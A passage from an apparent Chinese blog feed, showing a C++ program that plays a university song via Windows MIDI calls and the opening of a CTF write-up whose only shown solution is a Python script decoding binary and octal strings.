class="line"></span><br><span class="line">    G3 = <span class="number">55</span>, F3s = <span class="number">54</span>, F3 = <span class="number">53</span>, E3 = <span class="number">52</span>, D3s = <span class="number">51</span>, D3 = <span class="number">50</span>, C3s = <span class="number">49</span>, C3 = <span class="number">48</span>, B2 = <span class="number">47</span>, A2s = <span class="number">46</span>, A2 = <span class="number">45</span>,</span><br><span class="line"></span><br><span class="line">    G2s = <span class="number">44</span>, G2 = <span class="number">43</span>, F2s = <span class="number">42</span>, F2 = <span class="number">41</span>, E2 = <span class="number">40</span>, D2s = <span class="number">39</span>, D2 = <span class="number">38</span>, C2s = <span class="number">37</span>, C2 = <span class="number">36</span>, B1 = <span class="number">35</span>, A1s = <span class="number">34</span>,</span><br><span class="line"></span><br><span class="line">    A1 = <span class="number">33</span>, G1s = <span class="number">32</span>, G1 = <span class="number">31</span>, F1s = <span class="number">30</span>, F1 = <span class="number">29</span>, E1 = <span class="number">28</span>, D1s = <span class="number">27</span>, D1 = <span class="number">26</span>, C1s = <span class="number">25</span>, C1 = <span class="number">24</span>, B0 = <span class="number">23</span>,</span><br><span class="line"></span><br><span class="line">    A0s = <span class="number">22</span>, A0 = <span class="number">21</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>然后是Voice函数，这个是控制声音的</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Voice</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    X1 = C2, X2 = D2, X3 = E2, X4 = F2, X5 = G2, X6 = A2, X7 = B2,</span><br><span class="line"></span><br><span class="line">    L1 = C3, L2 = D3, L3 = E3, L4 = F3, L5 = G3, L6 = A3, L7 = B3,</span><br><span class="line"></span><br><span class="line">    M1 = C4, M2 = D4, M3 = E4, M4 = F4, M5 = G4, M6 = A4, M7 = B4,</span><br><span class="line"></span><br><span class="line">    H1 = C5, H2 = D5, H3 = E5, H4 = F5, H5 = G5, H6 = A5, H7 = B5,</span><br><span class="line"></span><br><span class="line">    LOW_SPEED = <span class="number">500</span>, MIDDLE_SPEED = <span class="number">400</span>, HIGH_SPEED = <span class="number">300</span>,</span><br><span class="line"></span><br><span class="line">    _ = <span class="number">0XFF</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>然后就到最核心的了，就是编谱，把简谱翻译成代码</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span>   <span class="title">QFNU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMIDIOUT handle;</span><br><span class="line">    <span class="built_in">midiOutOpen</span>(&amp;handle, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, CALLBACK_NULL);</span><br><span class="line">    <span class="type">int</span> volume = <span class="number">0x7f</span>;</span><br><span class="line">    <span class="type">int</span> voice = <span class="number">0x0</span>;</span><br><span class="line">    <span class="type">int</span> sleep = <span class="number">300</span>;</span><br><span class="line">    <span class="type">int</span> QFNU[] =</span><br><span class="line">    &#123;</span><br><span class="line">         M1,_,M1,_,M1,_,M2,_,</span><br><span class="line">        M3,_,M5,_,M5,_,_,_,</span><br><span class="line">        M6,_,M6,_,M5,_,M3,_,</span><br><span class="line">        M1,_,M2,M3,M2,_,_,_,</span><br><span class="line">        M3,_,M3,_,M5,_,M5,_,</span><br><span class="line">        M3,_,M2,_,M1,_,L6,_,</span><br><span class="line">        L5,L6,M1,M2,M3,_,M5,_,</span><br><span class="line">        M2,_,_,_,_,_,</span><br><span class="line">        M1,_,M1,_,M1,_,M2,_,</span><br><span class="line">        M3,_,M5,_,M5,_,_,</span><br><span class="line">        M6,_,M6,_,M5,_,M3,_,</span><br><span class="line">        M1,_,M2,M3,M2,_,_,</span><br><span class="line">        M3,_,M3,_,M5,_,M5,_,</span><br><span class="line">        M3,_,M2,_,M1,_,L6,_,</span><br><span class="line">        L5,L6,M1,M2,M3,_,M2,_,</span><br><span class="line">        M1,_,_,_,_,</span><br><span class="line">        H1,_,H1,_,H1,_,_,_,</span><br><span class="line">        M3,_,M5,M6,M5,_,_,_,</span><br><span class="line">        M6,_,M5,_,M4,_,M1,_,</span><br><span class="line">        M7,_,M6,M7,M5,_,_,_,</span><br><span class="line">        M6,_,H1,_,H1,_,H1,_,</span><br><span class="line">        M3,_,M5,M6,M6,_,M6,_,</span><br><span class="line">        M6,M5,M4,M4,M4,_,_,_,</span><br><span class="line">        M2,M2,M2,M3,_,M2,_,_,_,</span><br><span class="line">        H1,_,H1,_,H1,_,_,_,</span><br><span class="line">        M3,_,M5,M6,M5,_,_,_,</span><br><span class="line">        M6,_,M5,_,M4,_,M1,_,</span><br><span class="line">        M7,_,M6,M7,M5,_,_,_,</span><br><span class="line">        M6,_,H1,_,H1,_,H1,_,</span><br><span class="line">        M3,M3,M5,M6,M6,_,_,_,</span><br><span class="line">        M2,M3,M5,M5,M5,M5,M5,M5,_,</span><br><span class="line">        H2,_,H2,_,M6,_,M7,_,</span><br><span class="line">        H1,H1,H1,H1,H1,H1,</span><br><span class="line">    &#125;;</span><br><span class="line">    	<span class="keyword">for</span> (<span class="keyword">auto</span> i : QFNU)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == LOW_SPEED || i == HIGH_SPEED || i == MIDDLE_SPEED)</span><br><span class="line">        &#123;</span><br><span class="line">            sleep = i;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span>) &#123; sleep = <span class="number">150</span>; <span class="keyword">continue</span>; &#125;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">700</span>) &#123; <span class="built_in">Sleep</span>(<span class="number">150</span>); <span class="keyword">continue</span>; &#125;</span><br><span class="line">        <span class="keyword">if</span> (i == _)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">Sleep</span>(<span class="number">300</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        voice = (volume &lt;&lt; <span class="number">16</span>) + ((i) &lt;&lt; <span class="number">8</span>) + <span class="number">0x90</span>;</span><br><span class="line">        <span class="built_in">midiOutShortMsg</span>(handle, voice);</span><br><span class="line">        cout &lt;&lt; voice &lt;&lt; endl;</span><br><span class="line">        <span class="built_in">Sleep</span>(sleep);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">midiOutClose</span>(handle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>最后用int main主函数调用就可以</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">QFNU</span>();<span class="comment">//犁牛之子</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;winmm.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Scale</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    Rest = <span class="number">0</span>, C8 = <span class="number">108</span>, B7 = <span class="number">107</span>, A7s = <span class="number">106</span>, A7 = <span class="number">105</span>, G7s = <span class="number">104</span>, G7 = <span class="number">103</span>, F7s = <span class="number">102</span>, F7 = <span class="number">101</span>, E7 = <span class="number">100</span>,</span><br><span class="line"></span><br><span class="line">    D7s = <span class="number">99</span>, D7 = <span class="number">98</span>, C7s = <span class="number">97</span>, C7 = <span class="number">96</span>, B6 = <span class="number">95</span>, A6s = <span class="number">94</span>, A6 = <span class="number">93</span>, G6s = <span class="number">92</span>, G6 = <span class="number">91</span>, F6s = <span class="number">90</span>, F6 = <span class="number">89</span>,</span><br><span class="line"></span><br><span class="line">    E6 = <span class="number">88</span>, D6s = <span class="number">87</span>, D6 = <span class="number">86</span>, C6s = <span class="number">85</span>, C6 = <span class="number">84</span>, B5 = <span class="number">83</span>, A5s = <span class="number">82</span>, A5 = <span class="number">81</span>, G5s = <span class="number">80</span>, G5 = <span class="number">79</span>, F5s = <span class="number">78</span>,</span><br><span class="line"></span><br><span class="line">    F5 = <span class="number">77</span>, E5 = <span class="number">76</span>, D5s = <span class="number">75</span>, D5 = <span class="number">74</span>, C5s = <span class="number">73</span>, C5 = <span class="number">72</span>, B4 = <span class="number">71</span>, A4s = <span class="number">70</span>, A4 = <span class="number">69</span>, G4s = <span class="number">68</span>, G4 = <span class="number">67</span>,</span><br><span class="line"></span><br><span class="line">    F4s = <span class="number">66</span>, F4 = <span class="number">65</span>, E4 = <span class="number">64</span>, D4s = <span class="number">63</span>, D4 = <span class="number">62</span>, C4s = <span class="number">61</span>, C4 = <span class="number">60</span>, B3 = <span class="number">59</span>, A3s = <span class="number">58</span>, A3 = <span class="number">57</span>, G3s = <span class="number">56</span>,</span><br><span class="line"></span><br><span class="line">    G3 = <span class="number">55</span>, F3s = <span class="number">54</span>, F3 = <span class="number">53</span>, E3 = <span class="number">52</span>, D3s = <span class="number">51</span>, D3 = <span class="number">50</span>, C3s = <span class="number">49</span>, C3 = <span class="number">48</span>, B2 = <span class="number">47</span>, A2s = <span class="number">46</span>, A2 = <span class="number">45</span>,</span><br><span class="line"></span><br><span class="line">    G2s = <span class="number">44</span>, G2 = <span class="number">43</span>, F2s = <span class="number">42</span>, F2 = <span class="number">41</span>, E2 = <span class="number">40</span>, D2s = <span class="number">39</span>, D2 = <span class="number">38</span>, C2s = <span class="number">37</span>, C2 = <span class="number">36</span>, B1 = <span class="number">35</span>, A1s = <span class="number">34</span>,</span><br><span class="line"></span><br><span class="line">    A1 = <span class="number">33</span>, G1s = <span class="number">32</span>, G1 = <span class="number">31</span>, F1s = <span class="number">30</span>, F1 = <span class="number">29</span>, E1 = <span class="number">28</span>, D1s = <span class="number">27</span>, D1 = <span class="number">26</span>, C1s = <span class="number">25</span>, C1 = <span class="number">24</span>, B0 = <span class="number">23</span>,</span><br><span class="line"></span><br><span class="line">    A0s = <span class="number">22</span>, A0 = <span class="number">21</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Voice</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    X1 = C2, X2 = D2, X3 = E2, X4 = F2, X5 = G2, X6 = A2, X7 = B2,</span><br><span class="line"></span><br><span class="line">    L1 = C3, L2 = D3, L3 = E3, L4 = F3, L5 = G3, L6 = A3, L7 = B3,</span><br><span class="line"></span><br><span class="line">    M1 = C4, M2 = D4, M3 = E4, M4 = F4, M5 = G4, M6 = A4, M7 = B4,</span><br><span class="line"></span><br><span class="line">    H1 = C5, H2 = D5, H3 = E5, H4 = F5, H5 = G5, H6 = A5, H7 = B5,</span><br><span class="line"></span><br><span class="line">    LOW_SPEED = <span class="number">500</span>, MIDDLE_SPEED = <span class="number">400</span>, HIGH_SPEED = <span class="number">300</span>,</span><br><span class="line"></span><br><span class="line">    _ = <span class="number">0XFF</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span>   <span class="title">QFNU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMIDIOUT handle;</span><br><span class="line">    <span class="built_in">midiOutOpen</span>(&amp;handle, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, CALLBACK_NULL);</span><br><span class="line">    <span class="type">int</span> volume = <span class="number">0x7f</span>;</span><br><span class="line">    <span class="type">int</span> voice = <span class="number">0x0</span>;</span><br><span class="line">    <span class="type">int</span> sleep = <span class="number">300</span>;</span><br><span class="line">    <span class="type">int</span> QFNU[] =</span><br><span class="line">    &#123;</span><br><span class="line">         M1,_,M1,_,M1,_,M2,_,</span><br><span class="line">        M3,_,M5,_,M5,_,_,_,</span><br><span class="line">        M6,_,M6,_,M5,_,M3,_,</span><br><span class="line">        M1,_,M2,M3,M2,_,_,_,</span><br><span class="line">        M3,_,M3,_,M5,_,M5,_,</span><br><span class="line">        M3,_,M2,_,M1,_,L6,_,</span><br><span class="line">        L5,L6,M1,M2,M3,_,M5,_,</span><br><span class="line">        M2,_,_,_,_,_,</span><br><span class="line">        M1,_,M1,_,M1,_,M2,_,</span><br><span class="line">        M3,_,M5,_,M5,_,_,</span><br><span class="line">        M6,_,M6,_,M5,_,M3,_,</span><br><span class="line">        M1,_,M2,M3,M2,_,_,</span><br><span class="line">        M3,_,M3,_,M5,_,M5,_,</span><br><span class="line">        M3,_,M2,_,M1,_,L6,_,</span><br><span class="line">        L5,L6,M1,M2,M3,_,M2,_,</span><br><span class="line">        M1,_,_,_,_,</span><br><span class="line">        H1,_,H1,_,H1,_,_,_,</span><br><span class="line">        M3,_,M5,M6,M5,_,_,_,</span><br><span class="line">        M6,_,M5,_,M4,_,M1,_,</span><br><span class="line">        M7,_,M6,M7,M5,_,_,_,</span><br><span class="line">        M6,_,H1,_,H1,_,H1,_,</span><br><span class="line">        M3,_,M5,M6,M6,_,M6,_,</span><br><span class="line">        M6,M5,M4,M4,M4,_,_,_,</span><br><span class="line">        M2,M2,M2,M3,_,M2,_,_,_,</span><br><span class="line">        H1,_,H1,_,H1,_,_,_,</span><br><span class="line">        M3,_,M5,M6,M5,_,_,_,</span><br><span class="line">        M6,_,M5,_,M4,_,M1,_,</span><br><span class="line">        M7,_,M6,M7,M5,_,_,_,</span><br><span class="line">        M6,_,H1,_,H1,_,H1,_,</span><br><span class="line">        M3,M3,M5,M6,M6,_,_,_,</span><br><span class="line">        M2,M3,M5,M5,M5,M5,M5,M5,_,</span><br><span class="line">        H2,_,H2,_,M6,_,M7,_,</span><br><span class="line">        H1,H1,H1,H1,H1,H1,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> i : QFNU)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == LOW_SPEED || i == HIGH_SPEED || i == MIDDLE_SPEED)</span><br><span class="line">        &#123;</span><br><span class="line">            sleep = i;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span>) &#123; sleep = <span class="number">150</span>; <span class="keyword">continue</span>; &#125;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">700</span>) &#123; <span class="built_in">Sleep</span>(<span class="number">150</span>); <span class="keyword">continue</span>; &#125;</span><br><span class="line">        <span class="keyword">if</span> (i == _)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">Sleep</span>(<span class="number">300</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        voice = (volume &lt;&lt; <span class="number">16</span>) + ((i) &lt;&lt; <span class="number">8</span>) + <span class="number">0x90</span>;</span><br><span class="line">        <span class="built_in">midiOutShortMsg</span>(handle, voice);</span><br><span class="line">        cout &lt;&lt; voice &lt;&lt; endl;</span><br><span class="line">        <span class="built_in">Sleep</span>(sleep);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">midiOutClose</span>(handle);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">QFNU</span>();<span class="comment">//犁牛之子</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="后期处理"><a href="#后期处理" class="headerlink" title="后期处理"></a>后期处理</h1><p>简单做个视频剪辑一下</p>
<p>被曲阜师范大学官方抖音号发表咯！~</p>
<p>复制口令戳下面代码块左上角↓</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">7.94 SYm:/ 简单用代码做个音乐，一起看看美好的曲园！# 曲阜师范大学 # 代码 # 编程 # 我在大学等你  https://v.douyin.com/iJnnEGjb/ 复制此链接，打开Dou音搜索，直接观看视频！</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>QFNU</category>
      </categories>
      <tags>
        <tag>QFNU</tag>
      </tags>
  </entry>
  <entry>
    <title>科来杯第十届山东省大学生网络安全技能大赛wp</title>
    <url>/posts/41329285.html</url>
    <content><![CDATA[<blockquote>
<p>原文始发于微信公众号（山警网络空间安全实验室）：<a class="link"   href="http://mp.weixin.qq.com/s?__biz=MjM5Njc1OTYyNA==&mid=2450786565&idx=1&sn=ecd301d5f308bc7e4f5901f6187beb8e&chksm=b104f8228673713458801f4e84e0726a382df97bb09be1ae1750073b40483d9c79812ae35a38&scene=126&sessionid=1698029627&key=47ecebb9f9a1a9ab37c23e2ab716e98f757cd43b66b9ad462906ba0d95aa0c311338df2b6a7be5217c18b6f8e0ecc3fe0b3593d1d83e569f93e61662305bc67a41fa74f80d8ba959eb1beacdb48156642618c50bfeecdf568ee4e32fd7bf89f0aeafe201cfc09580e84c5ed97ece0d93b923605a9b90ec6157a83efc7ab9b32a&ascene=15&uin=NTY2NTA4NjQ=&devicetype=Windows+10+x64&version=63060012&lang=zh_CN&session_us=gh_544c8c38eeaf&countrycode=AL&exportkey=n_ChQIAhIQTgqEnpI5i9/UgoicLHi+DBLuAQIE97dBBAEAAAAAAAn6Da/hwEkAAAAOpnltbLcz9gKNyK89dVj0n9PVNOKQBdN8rFDq8A9WHKDE7wDDJw1sWdUYSzYiQ48kYwjfuTQa3OR8YYoUe0NrX35xA+mChNNxZFcZC51KYRhk/SiovCpzuXNc0DbIZCC3PaiSPNEY1FpsLPksd9Q/AAPZATi0k7TjwBb5HTVpyn4qJxyoNe2ehnJ+U/n/kLQVFEklAE8UOxh1EVUNMUECRQItPitOSLpXdVq6fq+l5ucDwa0M9Sfvx2MDNscY6GTwoY+0HK6Lbc5UobrfYhWM0HjKfGP9Eec=&acctmode=0&pass_ticket=tg1T215QyFg8xQQl+CQeEL+QWFNoq2hjb6qpAGBy38ocTI5ZUM9OXfIibItwtoRN&wx_header=0&fontgear=2" >科来杯第十届山东省大学生网络安全技能大赛wp<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>赛制还是一如既往的奇葩，由于每人的方向不同，在赛后结合团队赛道和爱好者赛道社团成员的wp，共同完成了本文。</p>
<p>@挽歌 @sp4c1ous @Charshark @Mu.Chen</p>
<p>Mu.Chen内心os：</p>
<p>(理论题真的真的真的真的好重要啊呜呜呜呜</p>
<ul>
<li><p>前言</p>
</li>
<li><p>Misc</p>
<ul>
<li><p>简单编码</p>
</li>
<li><p>神秘的base</p>
</li>
<li><p>签到</p>
</li>
</ul>
</li>
<li><p>Stego</p>
<ul>
<li>我应该去爱你</li>
<li>数独</li>
<li>莫生气</li>
</ul>
</li>
<li><p>取证</p>
<ul>
<li>金刚大战哥斯拉</li>
<li>啊吧啊吧的数据包</li>
<li>小刘的硬盘</li>
</ul>
</li>
<li><p>Web</p>
<ul>
<li>uns</li>
</ul>
</li>
<li><p>Crypto</p>
<ul>
<li>小试牛刀</li>
<li>easyrsa</li>
</ul>
</li>
<li><p>re</p>
<ul>
<li>人生模拟</li>
</ul>
</li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="简单编码"><a href="#简单编码" class="headerlink" title="简单编码"></a>简单编码</h3><p>二进制和八进制</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">a = [<span class="string">&#x27;1010010&#x27;</span>,<span class="string">&#x27;110001&#x27;</span>,<span class="string">&#x27;1101011&#x27;</span>,<span class="string">&#x27;0172&#x27;</span>,<span class="string">&#x27;1010010&#x27;</span>,<span class="string">&#x27;1000101&#x27;</span>,<span class="string">&#x27;061&#x27;</span>,<span class="string">&#x27;0132&#x27;</span>,<span class="string">&#x27;0127&#x27;</span>,<span class="string">&#x27;1101100&#x27;</span>,<span class="string">&#x27;0144&#x27;</span>,<span class="string">&#x27;1001000&#x27;</span>,<span class="string">&#x27;1010010&#x27;</span>,<span class="string">&#x27;1010100&#x27;</span>,<span class="string">&#x27;0116&#x27;</span>,<span class="string">&#x27;0105&#x27;</span>,<span class="string">&#x27;0124&#x27;</span>,<span class="string">&#x27;110000&#x27;</span>,<span class="string">&#x27;110100&#x27;</span>,<span class="string">&#x27;0172&#x27;</span>,<span class="string">&#x27;1010001&#x27;</span>,<span class="string">&#x27;110000&#x27;</span>,<span class="string">&#x27;0144&#x27;</span>,<span class="string">&#x27;1001110&#x27;</span>,<span class="string">&#x27;1001101&#x27;</span>,<span class="string">&#x27;110001&#x27;</span>,<span class="string">&#x27;1010010&#x27;</span>,<span class="string">&#x27;0110&#x27;</span>,<span class="string">&#x27;1010100&#x27;</span>,<span class="string">&#x27;0154&#x27;</span>,<span class="string">&#x27;1110000&#x27;</span>,<span class="string">&#x27;1011000&#x27;</span>,<span class="string">&#x27;0122&#x27;</span>,<span class="string">&#x27;060&#x27;</span>,<span class="string">&#x27;110001&#x27;</span>,<span class="string">&#x27;0141&#x27;</span>,<span class="string">&#x27;1010110&#x27;</span>,<span class="string">&#x27;0105&#x27;</span>,<span class="string">&#x27;0144&#x27;</span>,<span class="string">&#x27;1001110&#x27;</span>,<span class="string">&#x27;0127&#x27;</span>,<span class="string">&#x27;1101100&#x27;</span>,<span class="string">&#x27;1010110&#x27;</span>,<span class="string">&#x27;1001000&#x27;</span>,<span class="string">&#x27;1010111&#x27;</span>,<span class="string">&#x27;0124&#x27;</span>,<span class="string">&#x27;0112&#x27;</span>,<span class="string">&#x27;0125&#x27;</span>,<span class="string">&#x27;1010010&#x27;</span>,<span class="string">&#x27;110000&#x27;</span>,<span class="string">&#x27;110101&#x27;</span>,<span class="string">&#x27;0113&#x27;</span>,<span class="string">&#x27;1010110&#x27;</span>,<span class="string">&#x27;1000101&#x27;</span>,<span class="string">&#x27;0144&#x27;</span>,<span class="string">&#x27;0116&#x27;</span>,<span class="string">&#x27;0127&#x27;</span>,<span class="string">&#x27;0154&#x27;</span>,<span class="string">&#x27;0122&#x27;</span>,<span class="string">&#x27;1000010&#x27;</span>,<span class="string">&#x27;1010100&#x27;</span>,<span class="string">&#x27;0154&#x27;</span>,<span class="string">&#x27;1001010&#x27;</span>,<span class="string">&#x27;1010111&#x27;</span>,<span class="string">&#x27;0122&#x27;</span>,<span class="string">&#x27;110000&#x27;</span>,<span class="string">&#x27;061&#x27;</span>,<span class="string">&#x27;0141&#x27;</span>,<span class="string">&#x27;1010110&#x27;</span>,<span class="string">&#x27;1000101&#x27;</span>,<span class="string">&#x27;110001&#x27;</span>,<span class="string">&#x27;0117&#x27;</span>,<span class="string">&#x27;0125&#x27;</span>,<span class="string">&#x27;1101100&#x27;</span>,<span class="string">&#x27;0122&#x27;</span>,<span class="string">&#x27;0110&#x27;</span>,<span class="string">&#x27;0123&#x27;</span>,<span class="string">&#x27;0124&#x27;</span>,<span class="string">&#x27;0116&#x27;</span>,<span class="string">&#x27;0105&#x27;</span>,<span class="string">&#x27;0124&#x27;</span>,<span class="string">&#x27;0125&#x27;</span>,<span class="string">&#x27;065&#x27;</span>,<span class="string">&#x27;1010011&#x27;</span>,<span class="string">&#x27;0126&#x27;</span>,<span class="string">&#x27;060&#x27;</span>,<span class="string">&#x27;0144&#x27;</span>,<span class="string">&#x27;0132&#x27;</span>,<span class="string">&#x27;1010111&#x27;</span>,<span class="string">&#x27;1101011&#x27;</span>,<span class="string">&#x27;1010010&#x27;</span>,<span class="string">&#x27;1001000&#x27;</span>,<span class="string">&#x27;1010100&#x27;</span>,<span class="string">&#x27;0154&#x27;</span>,<span class="string">&#x27;0112&#x27;</span>,<span class="string">&#x27;0125&#x27;</span>,<span class="string">&#x27;1010011&#x27;</span>,<span class="string">&#x27;1000101&#x27;</span>,<span class="string">&#x27;0126&#x27;</span>,<span class="string">&#x27;0141&#x27;</span>,<span class="string">&#x27;1010110&#x27;</span>,<span class="string">&#x27;1000110&#x27;</span>,<span class="string">&#x27;1000110&#x27;</span>,<span class="string">&#x27;1001110&#x27;</span>,<span class="string">&#x27;0127&#x27;</span>,<span class="string">&#x27;1101100&#x27;</span>,<span class="string">&#x27;1001110&#x27;</span>,<span class="string">&#x27;0110&#x27;</span>,<span class="string">&#x27;0127&#x27;</span>,<span class="string">&#x27;0124&#x27;</span>,<span class="string">&#x27;1001110&#x27;</span>,<span class="string">&#x27;1000101&#x27;</span>,<span class="string">&#x27;0122&#x27;</span>,<span class="string">&#x27;110000&#x27;</span>,<span class="string">&#x27;110101&#x27;</span>,<span class="string">&#x27;1001011&#x27;</span>,<span class="string">&#x27;1010110&#x27;</span>,<span class="string">&#x27;0105&#x27;</span>,<span class="string">&#x27;0144&#x27;</span>,<span class="string">&#x27;0102&#x27;</span>,<span class="string">&#x27;1010111&#x27;</span>,<span class="string">&#x27;1101100&#x27;</span>,<span class="string">&#x27;1010010&#x27;</span>,<span class="string">&#x27;0124&#x27;</span>,<span class="string">&#x27;1010100&#x27;</span>,<span class="string">&#x27;0126&#x27;</span>,<span class="string">&#x27;0160&#x27;</span>,<span class="string">&#x27;0125&#x27;</span>,<span class="string">&#x27;0122&#x27;</span>,<span class="string">&#x27;110000&#x27;</span>,<span class="string">&#x27;110000&#x27;</span>,<span class="string">&#x27;060&#x27;</span>,<span class="string">&#x27;0126&#x27;</span>,<span class="string">&#x27;1000101&#x27;</span>,<span class="string">&#x27;061&#x27;</span>,<span class="string">&#x27;1001110&#x27;</span>,<span class="string">&#x27;0125&#x27;</span>,<span class="string">&#x27;0154&#x27;</span>,<span class="string">&#x27;1010010&#x27;</span>,<span class="string">&#x27;0110&#x27;</span>,<span class="string">&#x27;0124&#x27;</span>,<span class="string">&#x27;0126&#x27;</span>,<span class="string">&#x27;1110000&#x27;</span>,<span class="string">&#x27;0125&#x27;</span>,<span class="string">&#x27;0123&#x27;</span>,<span class="string">&#x27;060&#x27;</span>,<span class="string">&#x27;110001&#x27;</span>,<span class="string">&#x27;1100001&#x27;</span>,<span class="string">&#x27;1010111&#x27;</span>,<span class="string">&#x27;1101011&#x27;</span>,<span class="string">&#x27;0144&#x27;</span>,<span class="string">&#x27;1001110&#x27;</span>,<span class="string">&#x27;1010111&#x27;</span>,<span class="string">&#x27;0154&#x27;</span>,<span class="string">&#x27;0122&#x27;</span>,<span class="string">&#x27;0116&#x27;</span>,<span class="string">&#x27;1010100&#x27;</span>,<span class="string">&#x27;1010110&#x27;</span>,<span class="string">&#x27;0112&#x27;</span>,<span class="string">&#x27;0131&#x27;</span>,<span class="string">&#x27;1010100&#x27;</span>,<span class="string">&#x27;0126&#x27;</span>,<span class="string">&#x27;0105&#x27;</span>,<span class="string">&#x27;071&#x27;</span>,<span class="string">&#x27;1010000&#x27;</span>,<span class="string">&#x27;0124&#x27;</span>,<span class="string">&#x27;110000&#x27;</span>,<span class="string">&#x27;111001&#x27;</span>,<span class="string">&#x27;0120&#x27;</span>,<span class="string">&#x27;1010100&#x27;</span>,<span class="string">&#x27;110000&#x27;</span>,<span class="string">&#x27;075&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(a[i]))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(a[i])==<span class="number">4</span> <span class="keyword">or</span> <span class="built_in">len</span>(a[i])==<span class="number">3</span>:</span><br><span class="line">        flag+=<span class="built_in">chr</span>(<span class="built_in">int</span>(a[i], <span class="number">8</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(a[i],<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>

<h3 id="神秘的base"><a href="#神秘的base" class="headerlink" title="神秘的base"></a>神秘的base</h3><p>换表base爆破</p>
